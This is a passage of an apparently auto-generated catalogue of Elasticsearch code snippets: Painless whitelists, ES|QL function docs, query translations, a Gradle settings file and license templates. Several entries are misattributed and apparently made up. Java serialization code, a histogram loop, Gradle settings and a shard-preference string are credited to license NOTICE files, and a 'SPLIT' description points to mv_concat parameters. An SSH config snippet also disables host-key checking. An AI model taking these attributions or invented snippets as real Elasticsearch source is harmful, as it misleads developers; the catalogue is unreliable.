dynamic data access is required.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.fields.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.field.Field @dynamic_type {\n  String getName()\n  boolean isEmpty()\n  int size()\n}\n\nclass org.elasticsearch.script.field.EmptyField @dynamic_type {\n  def get(def)\n  def get(int, def)\n}\n```\n\n----------------------------------------\n\nTITLE: Export Node Certificate\nDESCRIPTION: Exports the node's certificate from its keystore\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nkeytool -export -alias test-node -keystore test-node.jks -storepass keypass -file test-node.crt\n```\n\n----------------------------------------\n\nTITLE: Generating Boolean Query with Multi-Value Document Fields in Elasticsearch\nDESCRIPTION: This snippet shows how to create a boolean query using multi-value document fields in Elasticsearch. It uses script queries to filter based on field length conditions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_20\n\nLANGUAGE: json\nCODE:\n```\n{\"bool\":{\"should\":[{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalEqlScriptUtils.length(X0),params.v1)))\",\"params\":{\"v0\":\"file_name.keyword\",\"v1\":0}}},{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.lte(InternalEqlScriptUtils.length(X0),params.v1)))\",\"params\":{\"v0\":\"process_name\",\"v1\":0}}}]}\n```\n\n----------------------------------------\n\nTITLE: Resulting Composite Buckets Example\nDESCRIPTION: Shows the resulting composite buckets that would be created from the sample document. Each bucket represents a unique combination of keyword and number values from the source document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n{ \"keyword\": \"foo\", \"number\": 23 }\n{ \"keyword\": \"foo\", \"number\": 65 }\n{ \"keyword\": \"foo\", \"number\": 76 }\n{ \"keyword\": \"bar\", \"number\": 23 }\n{ \"keyword\": \"bar\", \"number\": 65 }\n{ \"keyword\": \"bar\", \"number\": 76 }\n```\n\n----------------------------------------\n\nTITLE: GeoIP Pipeline No Match Response\nDESCRIPTION: Sample response showing a document where the IP address could not be found in the GeoIP database, resulting in no additional fields being added.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/geoip-processor.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"_index\" : \"my-index-000001\",\n  \"_id\" : \"my_id\",\n  \"_version\" : 1,\n  \"_seq_no\" : 71,\n  \"_primary_term\": 1,\n  \"found\" : true,\n  \"_source\" : {\n    \"ip\" : \"80.231.5.0\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Hypotenuse Function Documentation\nDESCRIPTION: Documentation for a function that calculates the hypotenuse of two numbers in Elasticsearch SQL. The function accepts any numeric values as input and returns a double value. Special handling is implemented for infinity cases which return null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/hypot.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns the hypotenuse of two numbers. The input can be any numeric values, the return value is always a double. Hypotenuses of infinities are null.\n```\n\n----------------------------------------\n\nTITLE: Basic SQL Query with Keywords and Identifiers in Elasticsearch SQL\nDESCRIPTION: Demonstrates a simple SQL query with keywords (SELECT, FROM) and an identifier (table). This shows the basic syntax structure of Elasticsearch SQL queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-lexical-structure.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM table\n```\n\n----------------------------------------\n\nTITLE: Base64 Encoding and Decoding in Java\nDESCRIPTION: This snippet includes the Base64 class in java.util, which provides methods for encoding and decoding data in Base64 format. It includes encoders and decoders suitable for various scenarios such as MIME and URL formats.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_7\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.Base64 {\n  Base64.Decoder getDecoder()\n  Base64.Encoder getEncoder()\n  Base64.Decoder getMimeDecoder()\n  Base64.Encoder getMimeEncoder()\n  Base64.Encoder getMimeEncoder(int,byte[])\n  Base64.Decoder getUrlDecoder()\n  Base64.Encoder getUrlEncoder()\n}\n\nclass java.util.Base64$Decoder {\n  int decode(byte[],byte[])\n  byte[] decode(String)\n}\n\nclass java.util.Base64$Encoder {\n  int encode(byte[],byte[])\n  String encodeToString(byte[])\n  Base64.Encoder withoutPadding()\n}\n```\n\n----------------------------------------\n\nTITLE: Japanese Extended Mode Tokenization Example\nDESCRIPTION: Example output of kuromoji_tokenizer in extended mode showing unigram output for unknown words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-tokenizer.md#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n関西, 関西国際空港, 国際, 空港\nア, ブ, ラ, カ, ダ, ブ, ラ\n```\n\n----------------------------------------\n\nTITLE: Date Management in Java\nDESCRIPTION: This snippet defines the Date class which provides methods for manipulating date information, including comparison, obtaining timestamps, and converting to or from an Instant.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_12\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.Date {\n  () @nondeterministic\n  (long)\n  boolean after(Date)\n  boolean before(Date)\n  def clone()\n  int compareTo(Date)\n  Date from(Instant)\n  long getTime()\n  void setTime(long)\n}\n```\n\n----------------------------------------\n\nTITLE: Including Grouping Functions List in Markdown\nDESCRIPTION: This snippet includes a list of grouping functions from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/functions-operators/grouping-functions.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../_snippets/lists/grouping-functions.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Referencing COUNT_DISTINCT Function Documentation in Markdown\nDESCRIPTION: This snippet shows the structure of the documentation for the COUNT_DISTINCT function, including references to various sections and an embedded image for syntax visualization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/count_distinct.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `COUNT_DISTINCT` [esql-count_distinct]\n\n**Syntax**\n\n:::{image} ../../../images/functions/count_distinct.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/count_distinct.md\n:::\n\n:::{include} ../description/count_distinct.md\n:::\n\n:::{include} ../types/count_distinct.md\n:::\n\n:::{include} ../examples/count_distinct.md\n:::\n\n:::{include} ../appendix/count_distinct.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Defining Lithuanian Stop Words\nDESCRIPTION: Defines Lithuanian stop words to be used within Elasticsearch, providing a link to the Lucene document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_28\n\nLANGUAGE: markdown\nCODE:\n```\n`_lithuanian_`\n:   [Lithuanian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/lt/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Whitelist AggregationScript$Factory class for Painless\nDESCRIPTION: This snippet whitelists the AggregationScript$Factory class from the org.elasticsearch.script package for use in Painless scripts. Similar to AggregationScript, the @no_import annotation restricts direct imports while permitting member access through whitelisted members.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.aggs.txt#2025-04-21_snippet_1\n\nLANGUAGE: Painless\nCODE:\n```\nclass org.elasticsearch.script.AggregationScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Documenting Hyperbolic Sine Function in ESQL\nDESCRIPTION: This snippet provides a brief description of the hyperbolic sine function. It explains that the function returns the hyperbolic sine of a number and includes a link to the Wikipedia page for further information on hyperbolic functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/sinh.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nReturns the [hyperbolic sine](https://en.wikipedia.org/wiki/Hyperbolic_functions) of a number.\n```\n\n----------------------------------------\n\nTITLE: Viewing PostgreSQL Connector Sync Logs in Terminal\nDESCRIPTION: Terminal output showing the progress of the PostgreSQL connector syncing data to Elasticsearch. The logs show the number of records being created, updated, or deleted and conclude with a summary of the sync operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-postgresql-connector-client-tutorial.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n[FMWK][13:22:26][INFO] Fetcher <create: 499 update: 0 |delete: 0>\n[FMWK][13:22:26][INF0] Fetcher <create: 599 update: 0 |delete: 0>\n[FMWK][13:22:26][INFO] Fetcher <create: 699 update: 0 |delete: 0>\n...\n[FMWK][23:22:28][INF0] [oRXQwYYBLhXTs-qYpJ9i] Sync done: 3864 indexed, 0 deleted.\n(27 seconds)\n```\n\n----------------------------------------\n\nTITLE: Converting Elasticsearch Bulk Request to XContent Format\nDESCRIPTION: Implementation of the ToXContentObject interface to serialize the bulk request to the XContent format, which is used for API communication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-NOTICE.txt#2025-04-21_snippet_8\n\nLANGUAGE: java\nCODE:\n```\npublic XContentBuilder toXContent(XContentBuilder builder, Params params) throws IOException {\n    for (DocWriteRequest<?> request : requests) {\n        DocWriteRequest.OpType opType = request.opType();\n        if (opType == DocWriteRequest.OpType.DELETE) {\n            DeleteRequest deleteRequest = (DeleteRequest) request;\n            builder.startObject();\n            builder.startObject(opType.getLowercase());\n            if (request.index() != null) {\n                builder.field(\"_index\", request.index());\n            }\n            if (request.type() != null) {\n                builder.field(\"_type\", request.type());\n            }\n            if (request.id() != null) {\n                builder.field(\"_id\", request.id());\n            }\n            if (request.routing() != null) {\n                builder.field(\"routing\", request.routing());\n            }\n            if (request.version() >= 0) {\n                builder.field(\"version\", request.version());\n            }\n            if (request.versionType() != VersionType.INTERNAL) {\n                builder.field(\"version_type\", request.versionType().name().toLowerCase(Locale.ROOT));\n            }\n            builder.endObject();\n            builder.endObject();\n        } else {\n            IndexRequest indexRequest = (IndexRequest) request;\n            builder.startObject();\n            builder.startObject(opType.getLowercase());\n            if (request.index() != null) {\n                builder.field(\"_index\", request.index());\n            }\n            if (request.type() != null) {\n                builder.field(\"_type\", request.type());\n            }\n            if (request.id() != null) {\n                builder.field(\"_id\", request.id());\n            }\n            if (request.routing() != null) {\n                builder.field(\"routing\", request.routing());\n            }\n            if (request.version() >= 0) {\n                builder.field(\"version\", request.version());\n            }\n            if (request.versionType() != VersionType.INTERNAL) {\n                builder.field(\"version_type\", request.versionType().name().toLowerCase(Locale.ROOT));\n            }\n            builder.endObject();\n            builder.endObject();\n            builder.value(indexRequest.source());\n        }\n    }\n    return builder;\n}\n```\n\n----------------------------------------\n\nTITLE: Documenting SPLIT Function Parameters in Elasticsearch SQL\nDESCRIPTION: Describes the parameters for the SPLIT function in ESQL. It takes two parameters: a multivalue expression string and a delimiter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/mv_concat.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`string`\n:   Multivalue expression.\n\n`delim`\n:   Delimiter.\n```\n\n----------------------------------------\n\nTITLE: Unsigned Right Shift with Different Integer Types in Painless\nDESCRIPTION: This snippet explains the use of the unsigned right shift operator in Painless, showcasing its behavior with different integer types while detailing error handling and type promotions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_28\n\nLANGUAGE: painless\nCODE:\n```\nint i = -1 >>> 29; <1>\nlong l = i >>> 2L; <2>\n```\n\n----------------------------------------\n\nTITLE: IN Clause Operations\nDESCRIPTION: SQL queries using IN clauses with various data types and null handling scenarios.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test WHERE keyword IN ('foo', 'bar', 'lala', 'foo', concat('la', 'la'));\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"terms\":{\"keyword\":[\"foo\",\"bar\",\"lala\"],\"boost\":1.0}}\n```\n\n----------------------------------------\n\nTITLE: Scripted Metric Aggregation State After Init Script\nDESCRIPTION: This JavaScript snippet represents the state of the scripted metric aggregation after the init_script is executed on each shard.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-scripted-metric-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n\"state\" : {\n    \"transactions\" : []\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Block API Response\nDESCRIPTION: Example response from the Elasticsearch block API showing successful block addition with acknowledgment status and affected indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/index-block.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"acknowledged\" : true,\n  \"shards_acknowledged\" : true,\n  \"indices\" : [ {\n    \"name\" : \"my-index-000001\",\n    \"blocked\" : true\n  } ]\n}\n```\n\n----------------------------------------\n\nTITLE: Describing LEFT Function in Elasticsearch SQL\nDESCRIPTION: This snippet provides a description of the LEFT function in Elasticsearch SQL. It explains that the function returns a substring by extracting a specified number of characters from the left side of a given string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/left.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nReturns the substring that extracts *length* chars from *string* starting from the left.\n```\n\n----------------------------------------\n\nTITLE: Unsupported Subquery in PIVOT's IN Clause\nDESCRIPTION: Example of an unsupported PIVOT query that attempts to use a subquery to generate the list of values to pivot on.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test_emp PIVOT (SUM(salary) FOR languages IN (SELECT languages FROM test_emp WHERE languages <=2 GROUP BY languages))\n```\n\n----------------------------------------\n\nTITLE: Method Overloading Example\nDESCRIPTION: Shows how Painless handles Java standard library method overloading by renaming methods to avoid arity conflicts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/how-painless-dispatches-function.md#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\ngroup(int)\ngroup(String)\nnamedGroup(String)\n```\n\n----------------------------------------\n\nTITLE: Running Integration Tests for APM Data Plugin\nDESCRIPTION: Gradle command to run YAML REST tests for validating index templates and ingest pipeline functionality\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/apm-data/README.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew x-pack:plugin:apm-data:yamlRestTest\n```\n\n----------------------------------------\n\nTITLE: Non-Modular Plugin Entitlements Configuration\nDESCRIPTION: Configuration example for non-modular plugins using the ALL-UNNAMED module name to specify required entitlements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-classic-plugins.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nALL-UNNAMED:\n  - manage_threads\n  - set_https_connection_properties\n  - outbound_network\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Root Project in Gradle\nDESCRIPTION: Sets up the root project for Elasticsearch, including plugin management, dependency configurations, and build settings. It applies various plugins, configures repositories, and defines common properties and tasks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/qa/common/licenses/jtoml-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Gradle\nCODE:\n```\nimport org.elasticsearch.gradle.Architecture\nimport org.elasticsearch.gradle.OS\n\npluginManagement {\n  repositories {\n    mavenCentral()\n    gradlePluginPortal()\n  }\n}\n\nplugins {\n  id \"com.gradle.enterprise\" version \"3.15\"\n  id \"com.gradle.common-custom-user-data-gradle-plugin\" version \"1.11.1\"\n}\n\ninclude ':libs:elasticsearch-plugin-cli'\ninclude ':libs:elasticsearch-cli'\ninclude ':libs:elasticsearch-core'\ninclude ':libs:elasticsearch-secure-sm'\ninclude ':libs:elasticsearch-x-content'\ninclude ':libs:elasticsearch-lz4'\ninclude ':libs:elasticsearch-geo'\ninclude ':libs:elasticsearch-logging'\ninclude ':server'\n\ndependencyResolutionManagement {\n  versionCatalogs {\n    libs {\n      from(files(\"libs.versions.toml\"))\n    }\n  }\n}\n\nrootProject.name = 'elasticsearch'\n\napply from: file('gradle/build-scan.gradle')\napply from: file('gradle/ide.gradle')\napply from: file('gradle/repositories.gradle')\n\nBoolean isEclipse = System.getProperty(\"eclipse.launcher\") != null || project.hasProperty(\"eclipse\")\n\nString javaHome = providers.environmentVariable('JAVA_HOME').orElse(System.getProperty(\"java.home\")).get()\nString javaVersion = providers.environmentVariable('RUNTIME_JAVA_VERSION').orElse(System.getProperty(\"java.specification.version\")).get()\n\ngradle.projectsLoaded {\n  rootProject.subprojects {\n    pluginManager.withPlugin(\"java\") {\n      if (findProperty('compiler.java') != javaVersion) {\n        pluginManager.apply('org.elasticsearch.gradle.toolchain')\n      }\n    }\n  }\n}\n\nBoolean inFipsJvm = false\ntry {\n  inFipsJvm = javax.crypto.Cipher.getMaxAllowedKeyLength(\"AES\") > 128\n} catch (Exception e) {\n  // ignore\n}\n\nString minimumCompilerJavaVersionString = rootProject.file('.ci/java-versions.properties')\n  .readLines()\n  .findAll { it.startsWith('ES_BUILD_JAVA=') }\n  .collect { it.replace('ES_BUILD_JAVA=', '').trim() }\n  .first()\n\nInteger minimumCompilerJavaVersion = Integer.parseInt(minimumCompilerJavaVersionString)\n\nString runtimeJavaVersion = System.getProperty(\"java.specification.version\")\nString unsupportedJavaVersion = \"is unsupported. Please use a Java version for this build that is less than or equal to \" +\n  \"$javaVersion, and greater than or equal to $minimumCompilerJavaVersionString\"\n\nassert Integer.parseInt(javaVersion) <= Integer.parseInt(runtimeJavaVersion) :\n  \"JAVA_HOME=$javaHome with java version $javaVersion $unsupportedJavaVersion\"\nassert Integer.parseInt(minimumCompilerJavaVersionString) <= Integer.parseInt(javaVersion) :\n  \"JAVA_HOME=$javaHome with java version $javaVersion $unsupportedJavaVersion\"\n\nString compilerJavaHome = javaHome\n\ngradleEnterprise {\n  buildScan {\n    if (providers.systemProperty('disableBuildScan').map { it.toBoolean() }.getOrElse(false) == false) {\n      tag \"ES\"\n      tag isEclipse ? \"Eclipse\" : \"Internal\"\n      tag inFipsJvm ? \"FIPS\" : \"nonFIPS\"\n      tag \"min-compiler-jdk-$minimumCompilerJavaVersionString\"\n      tag \"runtime-jdk-${System.getProperty(\"java.specification.version\")}\"\n      tag \"compiler-jdk-$javaVersion\"\n      tag \"os-${OS.current()}\"\n      tag \"arch-${Architecture.current()}\"\n    }\n    publishOnFailure()\n    buildScanPublished { scan ->\n      if (System.getenv('CI') != null) {\n        println \"Build scan: $scan.buildScanUri\"\n      }\n    }\n  }\n}\n\nallprojects {\n  plugins.withType(JavaPlugin).configureEach {\n    sourceCompatibility = minimumCompilerJavaVersionString\n    targetCompatibility = minimumCompilerJavaVersionString\n  }\n  ext {\n    compilerJavaHome = new File(compilerJavaHome)\n    compilerJavaVersion = javaVersion\n    isEclipse = isEclipse\n    buildChecksDependsOnBuild = false\n    runtimeJavaVersion = Integer.parseInt(System.getProperty(\"java.specification.version\"))\n    inFipsJvm = inFipsJvm\n  }\n  if (project != rootProject) {\n    version = rootProject.version\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Locale Management in Java\nDESCRIPTION: This snippet defines the Locale class which represents a specific geographical, political, or cultural region. It includes constructors and methods for retrieving localized information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_27\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.Locale {\n  Locale CANADA\n  Locale CANADA_FRENCH\n  Locale CHINA\n  Locale CHINESE\n  Locale ENGLISH\n  Locale FRANCE\n  Locale FRENCH\n  Locale GERMAN\n  Locale GERMANY\n  Locale ITALIAN\n  Locale ITALY\n  Locale JAPAN\n  Locale JAPANESE\n  Locale KOREA\n  Locale KOREAN\n  Locale PRC\n  char PRIVATE_USE_EXTENSION\n  Locale ROOT\n  Locale SIMPLIFIED_CHINESE\n  Locale TAIWAN\n  Locale TRADITIONAL_CHINESE\n  Locale UK\n  char UNICODE_LOCALE_EXTENSION\n  Locale US\n  (String)\n  (String,String)\n  (String,String,String)\n  def clone()\n  List filter(List,Collection)\n  List filterTags(List,Collection)\n  Locale forLanguageTag(String)\n  Locale[] getAvailableLocales()\n  String getCountry()\n  Locale getDefault()\n  Locale getDefault(Locale.Category)\n  String getDisplayCountry()\n  String getDisplayCountry(Locale)\n  String getDisplayLanguage()\n  String getDisplayLanguage(Locale)\n  String getDisplayName()\n  String getDisplayName(Locale)\n  String getDisplayScript()\n  String getDisplayScript(Locale)\n  String getDisplayVariant()\n  String getDisplayVariant(Locale)\n  String getExtension(char)\n  Set getExtensionKeys()\n  String getISO3Country()\n  String getISO3Language()\n  String[] getISOCountries()\n  String[] getISOLanguages()\n  String getLanguage()\n  String getScript()\n  Set getUnicodeLocaleAttributes()\n  Set getUnicodeLocaleKeys()\n  String getUnicodeLocaleType(String)\n  String getVariant()\n  boolean hasExtensions()\n  Locale lookup(List,Collection)\n  String lookupTag(List,Collection)\n}\n```\n\n----------------------------------------\n\nTITLE: SSH Configuration for Azure VMs\nDESCRIPTION: SSH configuration for connecting to Azure VMs, including a direct command example and a configuration snippet for the ~/.ssh/config file to simplify connections.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_8\n\nLANGUAGE: text\nCODE:\n```\nHost *.cloudapp.net\n User elasticsearch\n StrictHostKeyChecking no\n UserKnownHostsFile=/dev/null\n IdentityFile ~/.ssh/azure-private.key\n```\n\n----------------------------------------\n\nTITLE: Describing Concat Function in Elasticsearch SQL\nDESCRIPTION: This snippet provides a brief description of the Concat function in ESQL. It explains that the function concatenates two or more strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/concat.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n**Description**\n\nConcatenates two or more strings.\n```\n\n----------------------------------------\n\nTITLE: Unicode Inc Copyright Notice\nDESCRIPTION: Copyright notice and usage limitations for Unicode conversion code used in UnicodeUtil.java\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-kuromoji/licenses/lucene-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright 2001-2004 Unicode, Inc.\n * \n * Disclaimer\n * \n * This source code is provided as is by Unicode, Inc. No claims are\n * made as to fitness for any particular purpose. No warranties of any\n * kind are expressed or implied. The recipient agrees to determine\n * applicability of information provided. If this file has been\n * purchased on magnetic or optical media from Unicode, Inc., the\n * sole remedy for any claim will be exchange of defective media\n * within 90 days of receipt.\n * \n * Limitations on Rights to Redistribute This Code\n * \n * Unicode, Inc. hereby grants the right to freely use the information\n * supplied in this file in the creation of products supporting the\n * Unicode Standard, and to make copies of this file in any form\n * for internal or external distribution as long as this notice\n * remains attached.\n */\n```\n\n----------------------------------------\n\nTITLE: MPL License Notice Template Text Block\nDESCRIPTION: Standard template text for the MPL license notice that should be included in source code files. Includes placeholders for original code details, copyright information, and alternative license provisions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/juniversalchardet-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n``The contents of this file are subject to the Mozilla Public License\\nVersion 1.1 (the \"License\"); you may not use this file except in\\ncompliance with the License. You may obtain a copy of the License at\\nhttp://www.mozilla.org/MPL/\\n\\nSoftware distributed under the License is distributed on an \"AS IS\"\\nbasis, WITHOUT WARRANTY OF ANY KIND, either express or implied. See the\\nLicense for the specific language governing rights and limitations\\nunder the License.\\n\\nThe Original Code is ______________________________________.\\n\\nThe Initial Developer of the Original Code is ________________________.\\nPortions created by ______________________ are Copyright (C) ______\\n_______________________. All Rights Reserved.\\n\\nContributor(s): ______________________________________.\\n\\nAlternatively, the contents of this file may be used under the terms\\nof the _____ license (the  \"[___] License\"), in which case the\\nprovisions of [______] License are applicable instead of those\\nabove.  If you wish to allow use of your version of this file only\\nunder the terms of the [____] License and not to allow others to use\\nyour version of this file under the MPL, indicate your decision by\\ndeleting  the provisions above and replace  them with the notice and\\nother provisions required by the [___] License.  If you do not delete\\nthe provisions above, a recipient may use your version of this file\\nunder either the MPL or the [___] License.\"\n```\n\n----------------------------------------\n\nTITLE: Defining Danish Stop Words\nDESCRIPTION: Indicates the Danish stop words and links to the corresponding Lucene resource.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_13\n\nLANGUAGE: markdown\nCODE:\n```\n`_danish_`\n:   [Danish stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/danish_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Comparing Histogram Calculation Methods in Elasticsearch\nDESCRIPTION: This code demonstrates two methods for calculating histogram buckets for ranges in Elasticsearch: the precise method using actual document values and the approximate method using encoded values. It shows the pros and cons of each approach.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-cloud-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n// precise histogram, uses the actual values from the document\nfor (int doc = 0; doc < n; doc++) {\n  int value = getValue(doc);\n  int bucket = value / interval;\n  ++counts[bucket];\n}\n\n// approximate histogram, uses the encoded values\nfor (int doc = 0; doc < n; doc++) {\n  int slot = getSlot(doc);\n  int approxValue = decodeSlot(slot);\n  int bucket = approxValue / interval;\n  ++counts[bucket];\n}\n```\n\n----------------------------------------\n\nTITLE: Using _shards Preference Parameter in Elasticsearch\nDESCRIPTION: Shows the _shards preference parameter which directs searches to specific shards, identified by their IDs, for targeted querying.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/slf4j-api-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\npreference=_shards:2,3\n```\n\n----------------------------------------\n\nTITLE: Conversion and System Functions in Elasticsearch SQL\nDESCRIPTION: A set of functions for type conversion and system information retrieval in Elasticsearch SQL. These functions allow for data type conversions and access to database and user information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/qa/server/single-node/src/javaRestTest/resources/org/elasticsearch/xpack/sql/qa/single_node/ConsistentFunctionArgHandlingIT-non-tested-functions.txt#2025-04-21_snippet_2\n\nLANGUAGE: SQL\nCODE:\n```\nCAST\nCONVERT\nDATABASE\nUSER\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: Template text for applying the Apache License 2.0 to software projects. The template includes placeholders for copyright year and owner information, along with the standard license declaration and reference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/guava-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Notice Template\nDESCRIPTION: Standard boilerplate notice text for applying the Apache License 2.0 to a software project. Includes placeholders for copyright year and owner information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/transport-netty4/licenses/netty-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    